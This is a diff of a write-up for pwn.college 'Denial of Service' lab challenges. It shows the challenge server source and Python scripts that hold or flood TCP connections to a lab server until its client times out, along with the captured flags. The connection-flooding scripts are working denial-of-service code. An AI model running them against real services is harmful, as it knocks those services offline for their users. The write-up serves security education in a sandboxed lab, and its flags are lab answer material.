@@ -920,11 +920,16 @@ On timeout, the client prints the flag and breaks out of the loop.
 
 We have to bombard the server so that it does not respond to the client, and we get a flag.
 
+```py title="~/script.py" showLineNumbers
+import socket
+
+s = socket.create_connection(("10.0.0.2", 31337))
+input("Holding connections open...\n")
+```
+
 ```py
-In [1]: import socket
-   ...: s = socket.create_connection(("10.0.0.2", 31337))
-   ...: input("DoSing server...\n")
-DoSing server...
+root@ip-10-0-0-1:~# python ~/script.py
+Holding connections open...
 pwn.college{YEX2Ry1o2FmWPH-DALp2yFdHjNO.QX3UDM2EDL4ITM0EzW}
 ```
 
@@ -932,7 +937,7 @@ pwn.college{YEX2Ry1o2FmWPH-DALp2yFdHjNO.QX3UDM2EDL4ITM0EzW}
 
 ## Denial of Service 2
 
-> The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.
+> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.
 >
 > This time the server forks a new process for each client connection.
 
@@ -991,69 +996,35 @@ We will have to send multiple connections to the server so that it does not resp
 
 Let's start with `100` connections.
 
+```py title="~/script.py" showLineNumbers
+import socket
+import time
+
+target = ("10.0.0.2", 31337)
+sockets = []
+
+for i in range(100):
+    try:
+        s = socket.create_connection(target, timeout=1)
+        sockets.append(s)
+        print(f"Held {i} connections")
+        time.sleep(0.05)
+    except Exception as e:
+        print("Error:", e)
+        break
+
+input("Holding connections open...\n")
+```
+
 ```py
-In [1]: import socket
-   ...: import time
-   ...: 
-   ...: target = ("10.0.0.2", 31337)
-   ...: sockets = []
-   ...: 
-   ...: for i in range(100):
-   ...:     try:
-   ...:         s = socket.create_connection(target, timeout=1)
-   ...:         sockets.append(s)
-   ...:         print(f"Held {i} connections")
-   ...:         time.sleep(0.05)
-   ...:     except Exception as e:
-   ...:         print("Error:", e)
-   ...:         break
-   ...: 
-   ...: input("Holding connections open...\n")
+root@ip-10-0-0-1:/# python ~/script.py
 Held 0 connections
 Held 1 connections
-Held 2 connections
-Held 3 connections
-Held 4 connections
-Held 5 connections
-Held 6 connections
-Held 7 connections
-Held 8 connections
-Held 9 connections
-Held 10 connections
-Held 11 connections
-Held 12 connections
-Held 13 connections
-Held 14 connections
-Held 15 connections
-Held 16 connections
-Held 17 connections
-Held 18 connections
-Held 19 connections
-Held 20 connections
-Held 21 connections
-Held 22 connections
-Held 23 connections
-Held 24 connections
-Held 25 connections
-Held 26 connections
-Held 27 connections
-Held 28 connections
-Held 29 connections
-Held 30 connections
-Held 31 connections
-Held 32 connections
-Held 33 connections
-Held 34 connections
-Held 35 connections
-Held 36 connections
-Held 37 connections
-Held 38 connections
-Held 39 connections
-Held 40 connections
-Held 41 connections
-Held 42 connections
-Held 43 connections
+
+# --- snip ---
+
 Held 44 connections
+Held 45 connections
 Error: timed out
 Holding connections open...
 pwn.college{UYk-vC_7sk20Ga1gEsbb-_0T0BP.QX4UDM2EDL4ITM0EzW}
@@ -1062,6 +1033,92 @@ pwn.college{UYk-vC_7sk20Ga1gEsbb-_0T0BP.QX4UDM2EDL4ITM0EzW}
 &nbsp;
 
 ## Denial of Service 3
+
+> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.
+>
+> This time the server forks a new process for each client connection, and limits each session to 1 second.
+
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import os
+import socket
+import socketserver
+import time
+
+import psutil
+from dojjail import Host, Network
+from dojjail.capabilities import limit_capabilities
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+
+class ServerHost(Host):
+    def entrypoint(self):
+        class ForkingTCPHandler(socketserver.BaseRequestHandler):
+            def handle(self):
+                self.request.settimeout(1)
+                try:
+                    self.request.recv(1024)
+                except (TimeoutError, socket.timeout):
+                    return
+
+        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
+            server.serve_forever()
+
+class ClientHost(Host):
+    def entrypoint(self):
+        while True:
+            try:
+                with socket.create_connection(("10.0.0.2", 31337), timeout=60) as client_socket:
+                    client_socket.sendall(b"Hello, World!\n")
+                time.sleep(1)
+            except (TimeoutError, socket.timeout) as e:
+                print(flag, flush=True)
+                break
+            except (OSError, ConnectionError):
+                continue
+
+user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+server_host = ServerHost("ip-10-0-0-2")
+client_host = ClientHost("ip-10-0-0-3")
+network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
+                  subnet="10.0.0.0/24")
+network.run()
+
+user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
+```
+
+This time we have to do multithreading in order to 
+
+```py title="~/script.py" showLineNumbers
+import socket
+import time
+import threading
+
+def spam():
+    while True:
+        try:
+            s = socket.create_connection(("10.0.0.2", 31337), timeout=1)
+            time.sleep(1)  
+            s.close()
+        except Exception:
+            pass
+        time.sleep(0.01) 
+
+for _ in range(500):  
+    threading.Thread(target=spam, daemon=True).start()
+
+# Keep main thread alive
+while True:
+    time.sleep(1)
+```
+
+```
+root@ip-10-0-0-1:/# python ~/script.py 
+pwn.college{orOZm1YzShPJNpNGcX6vl2sDgCv.QX5UDM2EDL4ITM0EzW}
+```
 
 &nbsp;
 
